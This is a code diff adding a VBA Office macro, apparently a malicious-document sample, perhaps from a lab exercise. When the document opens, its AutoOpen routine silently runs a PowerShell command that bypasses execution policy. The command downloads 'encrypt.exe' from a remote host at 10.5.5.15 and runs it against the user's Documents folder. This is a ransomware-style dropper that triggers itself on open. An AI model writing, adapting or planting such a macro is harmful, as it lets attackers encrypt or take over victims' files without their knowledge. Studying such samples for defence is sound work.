@@ -1,0 +1,19 @@
+Sub somethinginteresting()
+'
+' somethinginteresting Macro
+'
+'
+  Dim shell
+  Set shell = CreateObject("WScript.Shell")
+
+  Dim command
+  command = "powershell -ExecutionPolicy Bypass -Command " & Chr(34) & "Invoke-WebRequest -URI 'http://10.5.5.15:8080/encrypt.exe' -OutFile C:\Users\User\Downloads\encrypt.exe; & C:\Users\User\Downloads\encrypt.exe C:\Users\User\Documents\ " & Chr(34)
+  ActiveDocument.Content.InsertAfter Text:=command
+  shell.Run command, 0, True
+
+End Sub
+
+Sub AutoOpen()
+  somethinginteresting
+End Sub
+
